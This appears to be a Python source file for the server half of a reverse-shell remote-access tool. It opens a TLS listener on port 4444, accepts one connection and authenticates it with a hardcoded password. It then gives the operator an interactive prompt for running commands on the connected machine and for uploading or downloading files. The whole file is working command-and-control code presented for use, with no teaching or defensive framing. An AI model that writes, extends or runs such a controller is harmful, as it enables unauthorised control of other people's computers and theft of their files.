import socket
import json
import logging
import base64
import ssl
import os
import struct

# Constants
HOST = '0.0.0.0'
PORT = 4444
BUFFER_SIZE = 8192
TIMEOUT = 30
PASSWORD = 'changeme123'  # Change this to a strong password
CERT_FILE = 'server.crt'
KEY_FILE = 'server.key'

# Configure logging
logging.basicConfig(
    filename='server.log',
    level=logging.INFO,
    format='%(asctime)s - %(message)s'
)

def generate_self_signed_cert(cert_file, key_file):
    if os.path.exists(cert_file) and os.path.exists(key_file):
        return
    from cryptography import x509
    from cryptography.x509.oid import NameOID
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.backends import default_backend
    import datetime

    key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COUNTRY_NAME, u'US'),
        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, u'California'),
        x509.NameAttribute(NameOID.LOCALITY_NAME, u'San Francisco'),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, u'MyOrg'),
        x509.NameAttribute(NameOID.COMMON_NAME, u'localhost'),
    ])
    cert = x509.CertificateBuilder().subject_name(
        subject
    ).issuer_name(
        issuer
    ).public_key(
        key.public_key()
    ).serial_number(
        x509.random_serial_number()
    ).not_valid_before(
        datetime.datetime.utcnow()
    ).not_valid_after(
        datetime.datetime.utcnow() + datetime.timedelta(days=365)
    ).sign(key, hashes.SHA256(), default_backend())

    with open(cert_file, "wb") as f:
        f.write(cert.public_bytes(serialization.Encoding.PEM))
    with open(key_file, "wb") as f:
        f.write(key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        ))

def start_server(ip, port):
    generate_self_signed_cert(CERT_FILE, KEY_FILE)
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((ip, port))
    server.listen(1)
    logging.info(f"[+] Server started on {ip}:{port}")
    print(f"[+] Listening for incoming SSL connections on {ip}:{port}...")
    return server, context

def send_json(connection, data):
    try:
        json_data = json.dumps(data).encode('utf-8')
        length = struct.pack('>I', len(json_data))
        connection.sendall(length + json_data)
    except Exception as e:
        logging.error(f"Send error: {e}")
        raise

def receive_json(connection):
    try:
        connection.settimeout(TIMEOUT)
        raw_length = b''
        while len(raw_length) < 4:
            chunk = connection.recv(4 - len(raw_length))
            if not chunk:
                raise Exception("Connection closed while reading length prefix")
            raw_length += chunk
        msg_length = struct.unpack('>I', raw_length)[0]
        data = b''
        while len(data) < msg_length:
            chunk = connection.recv(min(BUFFER_SIZE, msg_length - len(data)))
            if not chunk:
                raise Exception("Connection closed while reading data")
            data += chunk
        return json.loads(data.decode('utf-8'))
    except socket.timeout:
        logging.error("Receive timeout")
        raise Exception("Receive timeout")
    except Exception as e:
        logging.error(f"Receive error: {e}")
        raise

def is_safe_path(basedir, path):
    # Prevent path traversal
    return os.path.abspath(os.path.join(basedir, path)).startswith(os.path.abspath(basedir))

def interactive_shell(connection):
    print("\n[+] Interactive shell started. Type 'exit' to quit.")
    authenticated = False
    for _ in range(3):
        send_json(connection, {"auth": True})
        resp = receive_json(connection)
        if resp.get("password") == PASSWORD:
            send_json(connection, {"auth": "ok"})
            authenticated = True
            break
        else:
            send_json(connection, {"auth": "fail"})
    if not authenticated:
        print("[-] Authentication failed. Closing connection.")
        return
    print("[+] Authenticated!")
    while True:
        try:
            command = input("Shell#: ").strip()
            if not command:
                continue
            send_json(connection, {"cmd": command})
            if command.lower() == 'exit':
                break
            elif command[:6].lower() == 'upload':
                try:
                    ack = receive_json(connection)
                    if ack == "READY_TO_RECEIVE":
                        filename = command[7:].strip()
                        if not is_safe_path('.', filename):
                            print("[-] Unsafe file path.")
                            send_json(connection, "UPLOAD_ABORT")
                            continue
                        with open(filename, 'rb') as f:
                            file_data = base64.b64encode(f.read()).decode('utf-8')
                        send_json(connection, file_data)
                    else:
                        print("[-] Client not ready for upload.")
                except Exception as e:
                    print(f"[-] Upload error: {e}")
            elif command[:8].lower() == 'download':
                try:
                    response = receive_json(connection)
                    filename = command[9:].strip()
                    if response != "FileNotFound":
                        if not is_safe_path('.', filename):
                            print("[-] Unsafe file path.")
                            continue
                        with open(filename, 'wb') as f:
                            f.write(base64.b64decode(response))
                        print(f"[+] Downloaded: {filename}")
                    else:
                        print("[-] File not found on client.")
                except Exception as e:
                    print(f"[-] Download error: {e}")
            else:
                try:
                    response = receive_json(connection)
                    print(response)
                except Exception as e:
                    print(f"[-] Failed to receive response: {e}")
                    break
        except KeyboardInterrupt:
            print("\n[!] Shell interrupted.")
            break
        except Exception as e:
            print(f"[-] Error: {e}")
            break

if __name__ == "__main__":
    server = None
    ssl_context = None
    try:
        server, ssl_context = start_server(HOST, PORT)
        conn, addr = server.accept()
        ssl_conn = ssl_context.wrap_socket(conn, server_side=True)
        logging.info(f"[+] Connection from {addr}")
        print(f"[+] SSL connection established with {addr}")
        interactive_shell(ssl_conn)
    except KeyboardInterrupt:
        print("\n[!] Server stopped by user.")
        logging.info("Server stopped manually.")
    except Exception as e:
        logging.error(f"Server crash: {e}")
        print(f"[-] Server error: {e}")
    finally:
        if server:
            server.close()
